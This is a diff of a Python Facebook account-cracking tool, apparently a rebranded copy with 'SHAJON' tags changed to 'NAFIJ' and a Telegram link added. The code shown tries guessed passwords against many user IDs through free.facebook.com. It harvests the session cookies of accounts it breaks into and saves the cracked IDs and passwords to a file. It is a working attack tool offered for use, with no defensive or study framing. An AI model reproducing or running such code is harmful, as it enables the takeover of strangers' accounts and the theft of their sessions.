@@ -94,9 +94,11 @@ while attemps < 12345677901:
         print(' \033[0;92mYou Have Successfully Logged in.')
         break
     else:
-        print(' Incorrect Pass Please Try Again')
-        attemps += 1
+        print(' Incorrect Pass Please Try Again')      
+        attemps += 1     
         continue
+os.system('espeak -a 300 "Welcome bro"')
+os.system('xdg-open https://t.me/TBHHACKER')         
 os.system('clear')
 #--------------------------------- APP CHECKER ---------------------------------#
 def cek_apk(session,coki):
@@ -226,7 +228,7 @@ def shajon_crack(uid,pwx,tl):
             pro = random.choice(ugen)
             session = requests.Session()
             sys.stdout.flush()
-            sys.stdout.write('\r%s[SHAJON] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(H,loop,tl,len(oks),len(cps))),
+            sys.stdout.write('\r%s[NAFIJ] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(H,loop,tl,len(oks),len(cps))),
             free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -264,9 +266,9 @@ def shajon_crack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = str(uid)
-                print('\033[1;32m[SHAJON-OK] ' +cid+ ' | ' +ps+ '\n\033[1;33mCOOKIE : \033[1;33m'+coki +'\033[0;37m')
+                print('\033[1;32m[NAFIJ-OK] ' +cid+ ' | ' +ps+ '\n\033[1;33mCOOKIE : \033[1;33m'+coki +'\033[0;37m')
                 cek_apk(session,coki)
-                open('SHAJON-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('NAFIJ-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
